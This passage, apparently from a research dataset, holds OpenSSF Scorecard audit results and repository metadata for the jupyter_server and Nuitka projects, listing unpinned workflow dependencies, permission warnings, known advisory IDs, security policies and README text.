                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/enforce-label.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/enforce-label.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/prep-release.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/prep-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/prep-release.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/prep-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-changelog.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-changelog.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-changelog.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-changelog.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-changelog.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-changelog.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-release.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:80: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:81: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:194: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:195: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:207: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:208: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:228: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:111: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:112: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:157: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:159: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:164: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:185: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:186: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:189: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:173: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:174: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:175: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:96: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:97: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:124: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:125: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/python-tests.yml:137: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:138: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:139: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:147: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/python-tests.yml:148: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/python-tests.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/downstream.yml:27",
                        "Warn: pipCommand not pinned by hash: .github/workflows/downstream.yml:28",
                        "Warn: pipCommand not pinned by hash: .github/workflows/downstream.yml:69",
                        "Warn: npmCommand not pinned by hash: .github/workflows/python-tests.yml:88",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-tests.yml:100",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-tests.yml:101",
                        "Warn: pipCommand not pinned by hash: .github/workflows/python-tests.yml:162",
                        "Info:   0 out of  20 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  41 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   6 pipCommand dependencies pinned",
                        "Info:   0 out of   1 npmCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 23 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/jupyter-server/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/jupyter-server/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/jupyter-server/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/jupyter-server/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v2.14.2 not signed: https://api.github.com/repos/jupyter-server/jupyter_server/releases/165236777",
                        "Warn: release artifact v2.14.1 not signed: https://api.github.com/repos/jupyter-server/jupyter_server/releases/158266328",
                        "Warn: release artifact v2.14.0 not signed: https://api.github.com/repos/jupyter-server/jupyter_server/releases/150781794",
                        "Warn: release artifact v2.13.0 not signed: https://api.github.com/repos/jupyter-server/jupyter_server/releases/144627162",
                        "Warn: release artifact v2.12.5 not signed: https://api.github.com/repos/jupyter-server/jupyter_server/releases/137234451",
                        "Warn: release artifact v2.14.2 does not have provenance: https://api.github.com/repos/jupyter-server/jupyter_server/releases/165236777",
                        "Warn: release artifact v2.14.1 does not have provenance: https://api.github.com/repos/jupyter-server/jupyter_server/releases/158266328",
                        "Warn: release artifact v2.14.0 does not have provenance: https://api.github.com/repos/jupyter-server/jupyter_server/releases/150781794",
                        "Warn: release artifact v2.13.0 does not have provenance: https://api.github.com/repos/jupyter-server/jupyter_server/releases/144627162",
                        "Warn: release artifact v2.12.5 does not have provenance: https://api.github.com/repos/jupyter-server/jupyter_server/releases/137234451"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/prep-release.yml:30",
                        "Warn: no topLevel permission defined: .github/workflows/downstream.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/enforce-label.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/prep-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-changelog.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/python-tests.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-9mvj-f7w8-pvh2"
                    ],
                    "score": 9,
                    "reason": "1 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/jupyter-server/.github/contents/SECURITY.md",
        "SecurityPolicy_content": " Security Policy\n\n## Reporting a Vulnerability\n\nIf you find a security vulnerability in Jupyter, please report it to security@ipython.org.\n\nSee more information in our [docs](https://jupyter.org/security).\n",
        "project_all_labels": [
            "api-change",
            "backport-1.x",
            "backwards compat",
            "bug",
            "contributing-hour-idea",
            "dependencies",
            "deprecation",
            "documentation",
            "duplicate",
            "enhancement",
            "feature",
            "github_actions",
            "good first issue",
            "help wanted",
            "javascript",
            "maintenance",
            "needs discussion",
            "python",
            "question",
            "status:Needs Triage",
            "Still Needs Manual Backport",
            "Telemetry",
            "waiting for author",
            "wontfix"
        ],
        "README_content": "# Jupyter Server\n\n[![Build Status](https://github.com/jupyter-server/jupyter_server/actions/workflows/python-tests.yml/badge.svg?query=branch%3Amain++)](https://github.com/jupyter-server/jupyter_server/actions/workflows/python-tests.yml/badge.svg?query=branch%3Amain++)\n[![Documentation Status](https://readthedocs.org/projects/jupyter-server/badge/?version=latest)](http://jupyter-server.readthedocs.io/en/latest/?badge=latest)\n\nThe Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications like Jupyter notebook, JupyterLab, and Voila.\n\nFor more information, read our [documentation here](http://jupyter-server.readthedocs.io/en/latest/?badge=latest).\n\n## Installation and Basic usage\n\nTo install the latest release locally, make sure you have\n[pip installed](https://pip.readthedocs.io/en/stable/installing/) and run:\n\n```\npip install jupyter_server\n```\n\nJupyter Server currently supports Python>=3.6 on Linux, OSX and Windows.\n\n### Versioning and Branches\n\nIf Jupyter Server is a dependency of your project/application, it is important that you pin it to a version that works for your application. Currently, Jupyter Server only has minor and patch versions. Different minor versions likely include API-changes while patch versions do not change API.\n\nWhen a new minor version is released on PyPI, a branch for that version will be created in this repository, and the version of the main branch will be bumped to the next minor version number. That way, the main branch always reflects the latest un-released version.\n\nTo see the changes between releases, checkout the [CHANGELOG](https://github.com/jupyter/jupyter_server/blob/main/CHANGELOG.md).\n\n## Usage - Running Jupyter Server\n\n### Running in a local installation\n\nLaunch with:\n\n```\njupyter server\n```\n\n### Testing\n\nSee [CONTRIBUTING](https://github.com/jupyter-server/jupyter_server/blob/main/CONTRIBUTING.rst#running-tests).\n\n## Contributing\n\nIf you are interested in contributing to the project, see [`CONTRIBUTING.rst`](CONTRIBUTING.rst).\n\n## Team Meetings and Roadmap\n\n- When: Thursdays [8:00am, Pacific time](https://www.thetimezoneconverter.com/?t=8%3A00%20am&tz=San%20Francisco&)\n- Where: [Jovyan Zoom](https://zoom.us/my/jovyan?pwd=c0JZTHlNdS9Sek9vdzR3aTJ4SzFTQT09)\n- What: [Meeting notes](https://github.com/jupyter-server/team-compass/issues/45)\n\nSee our tentative [roadmap here](https://github.com/jupyter/jupyter_server/issues/127).\n\n## About the Jupyter Development Team\n\nThe Jupyter Development Team is the set of all contributors to the Jupyter project.\nThis includes all of the Jupyter subprojects.\n\nThe core team that coordinates development on GitHub can be found here:\nhttps://github.com/jupyter/.\n\n## Our Copyright Policy\n\nJupyter uses a shared copyright model. Each contributor maintains copyright\nover their contributions to Jupyter. But, it is important to note that these\ncontributions are typically only changes to the repositories. Thus, the Jupyter\nsource code, in its entirety is not the copyright of any single person or\ninstitution. Instead, it is the collective copyright of the entire Jupyter\nDevelopment Team. If individual contributors want to maintain a record of what\nchanges/contributions they have specific copyright on, they should indicate\ntheir copyright in the commit message of the change, when they commit the\nchange to one of the Jupyter repositories.\n\nWith this in mind, the following banner should be used in any source code file\nto indicate the copyright and license terms:\n\n```\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n```\n",
        "num_commits": 12760,
        "project_age_days": 2960,
        "project_created_at": "2016-09-21",
        "latest_updated_at": "2024-10-18",
        "latest_pushed_at": "2024-10-07",
        "num_contributors": 397,
        "num_pull": 1003,
        "num_issues": 1457,
        "num_opening_issue": 200,
        "project_size(kB)": 25821,
        "num_stargazers": 486,
        "num_watchers": 486,
        "num_forks": 302,
        "num_subscribers": 38,
        "SecurityPolicy_created_at": "2021-08-08 10:54:20",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "20e489dbbcfc5a37e2e2a4cae39cd92d8cd14358",
                "url": "https://github.com/jupyter-server/.github/commit/20e489dbbcfc5a37e2e2a4cae39cd92d8cd14358",
                "date": "2022-08-01 14:39:03"
            },
            {
                "commit_id": "c7465d62e8cb1b3b1d6a8680e12ec8e1af95bdbe",
                "url": "https://github.com/jupyter-server/.github/commit/c7465d62e8cb1b3b1d6a8680e12ec8e1af95bdbe",
                "date": "2021-08-08 10:54:20"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "nuitka/nuitka",
        "project_url": "https://github.com/nuitka/nuitka",
        "SSF": {
            "date": "2024-10-29T23:04:19+07:00",
            "repo": {
                "name": "github.com/nuitka/nuitka",
                "commit": "91401adbe789b35f22e7eb555d9b85e3a1154aaa"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.4,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'develop'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "1 out of 1 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 1/30 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: gsocindonesia contributor org/company found, py2many contributor org/company found, supabase contributor org/company found, TriliumNext contributor org/company found, codeflash contributor org/company found, google contributor org/company found, mediawiki4intranet contributor org/company found, conda-forge contributor org/company found, federal planning bureau contributor org/company found, loklak contributor org/company found, toontownfellowship contributor org/company found, MediumCendekia contributor org/company found, mipt contributor org/company found, nuitka services contributor org/company found, BesutKode contributor org/company found, coala contributor org/company found, jazzband contributor org/company found, alelec contributor org/company found, pywikibot contributor org/company found, PyCQA contributor org/company found, amfoss contributor org/company found, wikimedia contributor org/company found, netperfect contributor org/company found, moremoban contributor org/company found, franklin-ai contributor org/company found, SciNim contributor org/company found, liam2 contributor org/company found, googlers contributor org/company found, summerofcode contributor org/company found, fossasia contributor org/company found, Nuitka contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 31 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 25 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:121: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:162: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/testing.yml:164: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/testing.yml:167: update your workflow using https://app.stepsecurity.io/secureworkflow/Nuitka/Nuitka/testing.yml/develop?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/testing.yml:46",
                        "Warn: pipCommand not pinned by hash: .github/workflows/testing.yml:47",
                        "Warn: pipCommand not pinned by hash: .github/workflows/testing.yml:135",
                        "Warn: pipCommand not pinned by hash: .github/workflows/testing.yml:136",
                        "Info:   0 out of   7 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   4 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 1 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/testing.yml:16",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 10,
                    "reason": "GitHub workflow tokens follow principle of least privilege",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-g3rq-g295-4j3m / PYSEC-2021-66",
                        "Warn: Project is vulnerable to: GHSA-h5c8-rqwp-cp95",
                        "Warn: Project is vulnerable to: GHSA-h75v-3vvj-5mfj"
                    ],
                    "score": 7,
                    "reason": "3 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/nuitka/nuitka/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nThere are no LTS supported versions of Nuitka, but mostly the stable version is\nhot-fixed, and would be for security issues. If possible, git rebases would be\ndone just as they are for corruption bugs, which would then allow to use these,\nbut usually newer Nuitka is the expected to use version, with main always being\nas bug free as possible.\n\n| Version | Supported          |\n| ------- | ------------------ |\n| main    | :white_check_mark: |\n| develop | :white_check_mark: |\n\n## Reporting a Vulnerability\n\nWhen you email me at `kay.hayen@gmail.com` with a well defined report, I\nguarantee a reaction within 72h, and correction as soon as possible. Generally\nprivate emails are not acceptable for questions, there I would point to GitHub,\nbut for sensitive information only, it's great.\n",
        "project_all_labels": [
            "bug",
            "delayed",
            "develop",
            "duplicate",
            "enhancement",
            "excellent_report",
            "factory",
            "for_deletion",
            "funding_wanted",
            "help wanted",
            "invalid",
            "needs_example",
            "obsolete",
